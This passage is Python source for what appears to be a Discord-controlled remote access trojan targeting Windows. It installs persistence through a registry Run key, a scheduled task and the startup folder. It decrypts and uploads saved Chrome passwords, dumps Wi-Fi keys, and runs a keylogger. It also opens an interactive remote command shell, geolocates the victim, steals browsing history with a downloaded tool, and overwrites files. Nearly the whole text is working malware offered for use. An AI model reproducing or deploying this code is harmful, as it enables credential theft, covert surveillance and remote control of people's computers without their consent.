                                # Check and enable Task Scheduler Persistence if not already enabled
                                if not current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Starting Task Scheduler Persistence phase...")
                                        task_scheduler_persistence(script_path)
                                        await ctx.send("Task Scheduler Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting task scheduler persistence: {e}")
                                else:
                                    await ctx.send("Task Scheduler Persistence is already active.")

                                # Check and enable Startup Persistence if not already enabled
                                if not current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Starting Startup Persistence phase...")
                                        startup_persistence(script_path)
                                        await ctx.send("Startup Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting startup persistence: {e}")
                                else:
                                    await ctx.send("Startup Persistence is already active.")

                                await ctx.send("\n**Done with all phases! \nChecking status...**\n")

                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                NewResponse = "**New Persistence Status:**\n"
                                NewResponse += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(NewResponse)

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    def registry_persistence(script_path):
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        # Copy the original script to C:\Users\Public
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        shutil.copy(script_path, copied_script_path)

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))
                        except Exception as e:
                            print(f"Error adding registry persistence: {e}")

                        #os.system(f'start /MIN "{copied_script_path}"')

                    def task_scheduler_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                            'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = None
                        for path in possible_paths:
                            if Path(path).is_file():
                                pythonw_path = path
                                break

                        if pythonw_path is None:
                            print("pythonw.exe not found. Please specify the correct path.")
                            return

                        # Specify the path to the public directory
                        public_directory = Path('C:/Users/Public')

                        # Specify the path to place duplicate of script (Filename for duplicate is the "publicFileName" variable)
                        copied_script_path = public_directory / (publicFileName + ".pyw")

                        # Copy the script to the public directory
                        shutil.copyfile(script_path, copied_script_path)

                        # Use os.system to create a scheduled task
                        os.system(f"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \"{path} {copied_script_path}\" /RU {username} /f")

                    def startup_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                            'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = None
                        for path in possible_paths:
                            if Path(path).is_file():
                                pythonw_path = path
                                break

                        if pythonw_path is None:
                            print("pythonw.exe not found. ")
                            return
                        else:
                            public_directory = Path('C:/Users/Public')
                            copied_script_path = public_directory / (publicFileName + ".pyw")
                            shutil.copy(script_path, copied_script_path)

                            startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                            shortcut_path = startup_folder / f'{startupName}.lnk'

                            with open(f'{taskName}.bat', 'w') as batch_file:
                                batch_file.write(fr'''@echo off
                        start "" /B "{path}" "{copied_script_path}"
                        :: @echo off
                        :: start "" /B /MIN {pythonw_path} C:\Users\Public\{registryName}.pyw
                        ''')

                            os.system(f'copy {taskName}.bat "{startup_folder}"')
                        os.remove(f'{taskName}.bat')


                    # Checking of pre
                    @bot.command()
                    async def better_check(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_check":
                            script_path = os.path.abspath(sys.argv[0])
                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)
                            response = "**Persistence Status:**\n"
                            response += f"**Registry** Persistence: **{'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}** (Keyname is **{registryName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Task Scheduler** Persistence: **{'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}** (Taskname is **{taskName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Startup** Persistence: **{'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}** (Startup filename is **{startupName}.bat** and Actual filename is **{publicFileName}.pyw**)\n\n"

                            await ctx.send(response)

                    def CheckBetterPersistence(script_path):
                        registry_persistence_exists = check_registry_persistence(script_path)
                        task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)
                        startup_persistence_exists = check_startup_persistence(script_path)

                        return {
                            "registry_persistence": registry_persistence_exists,
                            "task_scheduler_persistence": task_scheduler_persistence_exists,
                            "startup_persistence": startup_persistence_exists,
                        }

                    def check_registry_persistence(script_path):
                        # Add your code to check registry persistence here
                        key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:
                                value, _ = winreg.QueryValueEx(registry_key, registryName)
                                return value == str(copied_script_path)
                        except Exception:
                            return False

                    def check_task_scheduler_persistence(script_path):
                        # Add your code to check task scheduler persistence here
                        result = os.system(f'schtasks /query /tn {taskName}')
                        return result == 0  # Task exists

                    def check_startup_persistence(script_path):
                        # Add your code to check startup folder persistence here
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.bat'

                        return os.path.exists(str(shortcut_path))


                    # Uninstall
                    @bot.command()
                    async def better_uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_uninstall":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path(script_path) != copied_script_path):
                                    await ctx.send("Hmm, Duplicated Script is not in the public directory.")    
                                else:
                                    await ctx.send(f"Duplicated Script is in the public directory as expected, removing it...")
                                    # Remove the script from the public directory
                                    os.remove(copied_script_path)
                                    await ctx.send(f"Duplicated Script removed from public directory! Continuing...")

                                if current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Disabling Registry Persistence...")
                                        remove_registry_persistence()
                                        await ctx.send("Registry Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling registry persistence: {e}")

                                if current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Removing Task Scheduler Persistence...")
                                        remove_task_scheduler_persistence()
                                        await ctx.send("Task Scheduler Persistence removed.")
                                    except Exception as e:
                                        await ctx.send(f"Error removing task scheduler persistence: {e}")

                                if current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Disabling Startup Persistence...")
                                        remove_startup_persistence()
                                        await ctx.send("Startup Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling startup persistence: {e}")

                                await ctx.send("\n**Done with uninstalling persistence!**\n")

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    # Add functions to remove persistence
                    def remove_registry_persistence():
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.DeleteValue(registry_key, registryName)
                        except Exception as e:
                            print(f"Error removing registry persistence: {e}")

                    def remove_task_scheduler_persistence():
                        os.system(f"schtasks /delete /tn {taskName} /f")

                    def remove_startup_persistence():
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.bat'

                        if os.path.exists(str(shortcut_path)):
                            os.remove(str(shortcut_path))



                    USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
                    TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

                    @bot.command()
                    async def passwords_chrome(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!passwords_chrome":
                            await ctx.send("Grabbing passwords...")
                            print("Chrome Password Decryptor by bytemafia")
                            file_location = os.path.join(os.getcwd(), "passwords.csv") # Full file path
                            with open(file_location, mode='w', newline='') as passfile: # Write file
                                writer = csv.writer(passfile, delimiter=',')
                                writer.writerow(["No      <->      URL      <->      Username      <->      Password"])
                                secret_key = secretKey()
                                default_folders = ("Profile", "Default")
                                data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
                                for data_folder in data_folders:
                                    db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
                                    con = login_db(db_path)
                                if secret_key and con:
                                    cur = con.cursor()
                                    cur.execute("select action_url, username_value, password_value from logins")
                                    for index, data in enumerate(cur.fetchall()):
                                        url = data[0]
                                        username = data[1]
                                        ciphertext = data[2]
                                        if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                                            password = password_decrypt(secret_key, ciphertext)
                                            writer.writerow([index, url, username, password])
                                    print("Completed! File is at: " + file_location)
                                    con.close()
                                    os.remove(TEMP_DB)

                            # Uploading the file to the Discord server channel
                            with open(file_location, 'rb') as file:
                                file = discord.File(file)
                                await ctx.send("Here are the Chrome passwords:", file=file)

                            # Remove the file after uploading
                            os.remove(file_location)

                    # Collecting secret key
                    def secretKey():
                        try:
                            with open(LOCAL_STATE_PATH, "r") as f:
                                local_state = f.read()
                                key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
                            key_buffer = base64.b64decode(key_text)[5:]
                            key = win32crypt.CryptUnprotectData(key_buffer)[1]
                            return key
                        except Exception as e:
                            print(e)

                    # Login to db where creds are stored
                    def login_db(db_path):
                        try:
                            shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
                            sql_connection = sqlite3.connect(TEMP_DB)
                            return sql_connection
                        except Exception as e:
                            print(e)

                    # Decrypt the password
                    def password_decrypt(secret_key, ciphertext):
                        try:
                            iv = ciphertext[3:15]
                            password_hash = ciphertext[15:-16]
                            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                            password = cipher.decrypt(password_hash).decode()
                            return password
                        except Exception as e:
                            print(e)

                    @bot.command()
                    async def interactive_cmd(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!interactive_cmd":
                            # Check if the command was sent in a text channel and matches the command trigger
                            initial_directory = "C:/Users"  # Replace with your actual directory path
                            await ctx.send(f"Interactive command prompt started in {initial_directory}. Type `exit` to exit.")

                            # Start a subprocess for the command prompt
                            process = subprocess.Popen(
                                ['cmd'],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True,
                                cwd=initial_directory  # Set the initial directory
                            )

                            # Read and discard the initial copyright message
                            while True:
                                output_line = process.stdout.readline().decode('latin-1').strip()
                                if not output_line or output_line.endswith(initial_directory + ">"):
                                    break

                            async def read_output():
                                while True:
                                    output_line = process.stdout.readline().decode('latin-1').strip()
                                    if not output_line or output_line.endswith(initial_directory + ">"):
                                        break
                                    await ctx.send(f"```\n{output_line}\n```")

                            try:
                                while True:
                                    user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)
                                    if user_input.content.lower() == 'exit':
                                        await ctx.send("Interactive command prompt ended.")
                                        break

                                    # Send user's input to the command prompt
                                    process.stdin.write(f"{user_input.content}\n".encode())
                                    process.stdin.flush()

                                    # Read the output of the previous command
                                    await read_output()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                            process.terminate()

                    @bot.command()
                    async def geolocate(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!geolocate":
                            await ctx.send("Calculating position...")
                            gmaps = googlemaps.Client(GOOGLE_API_KEY)
                            loc = gmaps.geolocate()
                            latitude = loc['location']['lat']
                            longitude = loc['location']['lng']
                            accuracy_radius = loc['accuracy']  # Get the accuracy radius

                            google_maps_link = f"https://maps.google.com/maps?q={latitude},{longitude}"
                            await ctx.send(f"Google Maps Link: {google_maps_link}")
                            await ctx.send(f"Accuracy Radius: {accuracy_radius} meters")

                    @bot.command()
                    async def messagebox(ctx, type, title, message):
                        if ctx.channel == created_channel:
                            try:
                                if not type or not title or not message:
                                    await ctx.send("Please make sure you use the following syntax:\n!messagebox [type] [title] [message]")
                                else:
                                    if type == "error":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showerror(title, message)

                                    elif type == "info":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showinfo(title, message)

                                    elif type == "warning":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showwarning(title, message)

                            except Exception as e:
                                await ctx.send(f"An error ocurred when showing messagebox:\n{e}")

                    # Network stealer
                    @bot.command()
                    async def network(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!network":
                            await ctx.send("Loading WiFi SSIDs and passwords...")
                            nameListString = ""
                            networkNames = subprocess.check_output("netsh wlan show profile", shell=True, text=True)
                            networkNamesLines = networkNames.splitlines()
                            for line in networkNamesLines:
                                line.strip()
                                if ':' in line:
                                    start = line.index(':') +1
                                    name = str(line[start:].strip())
                                    if len(name) > 1:
                                        try:
                                            checkInfo = f"netsh wlan show profile name=\"{name}\" key=clear"
                                            nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)
                                            nameInfo = nameInfo.splitlines()
                                        except subprocess.CalledProcessError:
                                            continue
                                        password = "[!] Not Found!"
                                        for i in nameInfo:
                                            if "Key Content" in i:
                                                start = i.index(":") +1
                                                password = i[start:].strip()
                                        nameListString += "\t\t" + name + "\t:\t" + password + "\n"
                            await ctx.send(f"**Saved Networks [NAME : PASSWORD]**:\n\n {nameListString}")

                    def secure_delete_file(path_to_file):
                        # Securely delete a file by setting its data to zero.
                        CallME('fsutil.exe file setZeroData offset=0 length=9999999999 "' + path_to_file + '"')
                        os.remove(path_to_file)

                    @bot.command()
                    async def securefile(ctx, path):
                        if ctx.channel == created_channel:
                            if not path:
                                await ctx.send("Please provide path to file (!securefile <path-to-file>).")
                                return
                            try:
                                secure_delete_file(path)
                                await ctx.send("Successfully fucked file!")
                                await ctx.message.add_reaction("\U0001F4A5")  # boom emoji
                            except FileNotFoundError as fnfe:
                                await ctx.send("The specified file was not found (" + str(fnfe) + ")")
                                return

                    @bot.command()
                    async def sendkey(ctx, Key):
                        if ctx.channel == created_channel:
                            if not Key:
                                await ctx.send("Please provide keys to be pressed (!SendKey <Hello-World\{ENTER\}>).")
                                return

                            await ctx.send("Creating .VBS script")

                            # Change all "-" to " "
                            Key = Key.replace("-", " ")

                            # Create new .vbs script to send key
                            script_path = r'C:\users\public\key.vbs'
                            with open(script_path, 'w') as f:
                                f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
                                f.write(f'WshShell.SendKeys "{Key}"\n')

                            # Execute .vbs script
                            await ctx.send("Executing Script!")
                            CallME(f'cscript "{script_path}"')

                            await ctx.send("Sent key: " + Key)
                            await ctx.send("Removing Script...")
                            os.remove(script_path)
                            await ctx.send("Script removed!")


                    # Create a variable to store the logged keys
                    logged_keys = []

                    # Define a global variable for the listener and is_logging
                    listener = None
                    is_logging = False

                    # Define keys that should trigger a new line
                    new_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])

                    def on_key_press(key):
                        global is_logging
                        if is_logging:
                            try:
                                # Check if the key is a modifier key and skip logging if it is
                                if isinstance(key, keyboard.KeyCode):
                                    logged_key = key.char
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")
                            except AttributeError:
                                if key == keyboard.Key.space:
                                    logged_key = " "
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")

                    def start_logging():
                        global listener, is_logging
                        logged_keys.clear()  # Clear previously logged keys
                        listener = keyboard.Listener(on_press=on_key_press)
                        listener.start()
                        is_logging = True
                        print("Logging started...")

                    def stop_logging():
                        global listener, is_logging
                        if listener:
                            listener.stop()
                            with open("keylog.txt", "w") as logfile:
                                logfile.write(" ".join(logged_keys))
                            is_logging = False
                            print("Logging stopped. Keys saved to 'keylog.txt'")

                    @bot.command()
                    async def startlog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                await ctx.send("Logging is already started. Use **!dumplog** to see logs.")
                            else:
                                start_logging()
                                await ctx.send("Logging started. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def stoplog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                stop_logging()
                                await ctx.send("Logging stopped. Use **!dumplog** to see logs.")
                            else:
                                await ctx.send("Logging is already stopped. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def dumplog(ctx):
                        if ctx.channel == created_channel:
                            global logged_keys
                            if logged_keys:
                                # Save the logged keys to a text file
                                with open("keylog.txt", "w") as logfile:
                                    logfile.write("".join(logged_keys))

                                # Send the log file as an attachment
                                await ctx.send("Here is the log:", file=discord.File("keylog.txt"))

                                # Delete the temporary log file
                                os.remove("keylog.txt")
                            else:
                                await ctx.send("No keys have been logged yet.")

                    @bot.command()
                    async def restart(ctx):
                        global created_channel
                        if ctx.channel == created_channel:

                            await ctx.send("Restarting...")

                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Delete channel
                            if created_channel:
                                await created_channel.delete()

                            # Exit the current script
                            sys.exit()


                    def installNirsoft(zip_file_url, exe_file_name):
                        # Destination path for the downloaded .zip file
                        zip_download_path = r"C:\\Users\\Public\\archive.zip"

                        # Directory where you want to extract the .exe file
                        extraction_directory = r"C:\\Users\\Public"

                        # Check if the .zip file already exists, and if not, download it
                        if not os.path.exists(zip_download_path):
                            try:
                                # Download the .zip file
                                response = requests.get(zip_file_url)
                                with open(zip_download_path, 'wb') as file:
                                    file.write(response.content)
                                print(f".zip File downloaded to {zip_download_path}")
                            except Exception as e:
                                print(f".zip File download failed: {str(e)}")

                        # Extract the .exe file from the .zip archive
                        try:
                            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                # Check if the .exe file exists in the archive
                                if exe_file_name in zip_ref.namelist():
                                    zip_ref.extract(exe_file_name, extraction_directory)
                                    exe_path = os.path.join(extraction_directory, exe_file_name)
                                    print(f".exe File extracted to {exe_path}")
                                else:
                                    print(f".exe file '{exe_file_name}' not found in the archive.")
                        except Exception as e:
                            print(f"Extraction of .exe file failed: {str(e)}")

                    def program_isInstalled(full_path_to_exe):
                        return os.path.exists(full_path_to_exe)


                    @bot.command()
                    async def history(ctx):
                        if ctx.channel == created_channel:
                            # URL of the .zip file to download
                            zip_file_url = "https://www.nirsoft.net/utils/browsinghistoryview.zip"

                            # Destination path for the downloaded .zip file
                            zip_download_path = r"C:\\Users\\Public\\archive.zip"

                            # Directory where you want to extract the .exe file
                            extraction_directory = r"C:\\Users\\Public"

                            # Command to execute after extracting the .exe file
                            command_to_execute = r'C:\Users\Public\BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml "C:\Users\Public\history.html"'

                            # Delete the files that were created by the previous command
                            # Check if any of the files (.html, .zip, .exe) exists
                            if (os.path.exists(extraction_directory + "\\history.html") or os.path.exists(zip_download_path) or os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe")):
                                # Delete the files
                                # Check if history.html exists
                                if os.path.exists(extraction_directory + "\\history.html"):
                                    os.remove(extraction_directory + "\\history.html")
                                # Check if the .zip file exists
                                if os.path.exists(zip_download_path):
                                    os.remove(zip_download_path)
                                # Check if the .exe file exists
                                if os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe"):
                                    os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted from last execution.")
                                await ctx.send(f".zip, .html, and .exe files deleted from last execution.")
                            else:
                                print("No files to delete from last command.")
                                await ctx.send("No files to delete from last command.")

                            # Check if the .zip file already exists, and if not, download it
                            if not os.path.exists(zip_download_path):
                                try:
                                    # Download the .zip file
                                    response = requests.get(zip_file_url)
                                    with open(zip_download_path, 'wb') as file:
                                        file.write(response.content)
                                    await ctx.send(f".zip File downloaded to {zip_download_path}")
                                    print(f".zip File downloaded to {zip_download_path}")
                                except Exception as e:
                                    await ctx.send(f".zip File download failed: {str(e)}")
                                    print(f".zip File download failed: {str(e)}")

                            # Extract the .exe file from the .zip archive
                            try:
                                with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                    # Specify the name of the .exe file you want to extract
                                    exe_file_name = "BrowsingHistoryView.exe"

                                    # Check if the .exe file exists in the archive
                                    if exe_file_name in zip_ref.namelist():
                                        zip_ref.extract(exe_file_name, extraction_directory)
                                        exe_path = os.path.join(extraction_directory, exe_file_name)
                                        await ctx.send(f".exe File extracted to {exe_path}")
                                        print(f".exe File extracted to {exe_path}")
                                    else:
                                        await ctx.send(f".exe file '{exe_file_name}' not found in the archive.")
                                        print(f".exe file '{exe_file_name}' not found in the archive.")
                            except Exception as e:
                                await ctx.send(f"Extraction of .exe file failed: {str(e)}")
                                print(f"Extraction of .exe file failed: {str(e)}")

                            # Execute the command using the extracted .exe file
                            try:
                                subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)
                                success_message = "Command executed successfully."
                                print(success_message)
                                await ctx.send(success_message)

                                # Send file to C2
                                await ctx.send("Sent file to C2", file=discord.File(extraction_directory + "\\history.html"))

                                # Delete the archive (.zip) and the extracted .exe file
                                os.remove(extraction_directory + "\\history.html")
                                os.remove(zip_download_path)
                                os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted.")
                                await ctx.send(".zip, .html, and .exe files deleted.")
                            except Exception as e:
                                error_message = f"Command execution failed: {str(e)}"
                                print(error_message)
                                await ctx.send("Error: " + error_message)

                    @bot.command()
                    async def volume(ctx, volume_amount):
                        if ctx.channel == created_channel:
                            try:
                                volume_amount = int(volume_amount)  # Convert the input to an integer

                                if program_isInstalled("C:\\Users\\Public\\nircmd.exe"):
                                    await ctx.send(f"NirCMD is installed and ready!")

                                    if (0 <= volume_amount <= 100):
                                        # Calculate from percentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                                else:
                                    await ctx.send("NirCMD is not installed, installing it now!")

                                    # Install NirCMD om man inte har det
                                    installNirsoft("https://www.nirsoft.net/utils/nircmd.zip", "nircmd.exe")

                                    await ctx.send("NirCMD has been installed.")
                                    if (0 <= volume_amount <= 100):
                                        # Calculate from procentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                            except ValueError:
                                await ctx.send("Invalid volume amount. Please provide a number between 0 and 100.")
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!install':
                            print("Received !install command")
                            await ctx.send("Installing the bot on startup...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows...")

                                    script_path = os.path.abspath(__file__)
                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

                                    try:
                                        if running_as_executable:
                                            await ctx.send("Client has the **.exe** extension on payload.")
                                            # If the script is an executable
                                            executable_path = sys.executable
                                            executable_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                            shutil.copy2(executable_path, executable_link_path)
                                            print(f"Executable copied to: {executable_link_path}")
                                        else:
                                            # If the script is a .py file
                                            if script_path.endswith('.py'):
                                                await ctx.send("Client has the **.py** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.py")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .py file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            elif script_path.endswith('.pyw'):
                                                await ctx.send("Client has the **.pyw** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.pyw")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .pyw file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            else:
                                                await ctx.send("Client has the **.exe** extension on payload.")
                                                # If the script is an .exe file
                                                exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                                shutil.copy2(script_path, exe_link_path)
                                                print(f"Executable copied to: **{exe_link_path}**")

                                        await ctx.send("Bot installed on startup!")
                                        print("Bot installed on startup!")
                                    except Exception as copy_error:
                                        await ctx.send(f"An error occurred while copying the script: {copy_error}")
                                        print(f"An error occurred while copying the script: {copy_error}")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                await ctx.send(f"An error occurred while checking the operating system: {os_error}")
                                print(f"An error occurred while checking the operating system: {os_error}")

                    @bot.command()
                    async def uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!uninstall':
                            print("Received !uninstall command")
                            await ctx.send("Uninstalling the bot...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
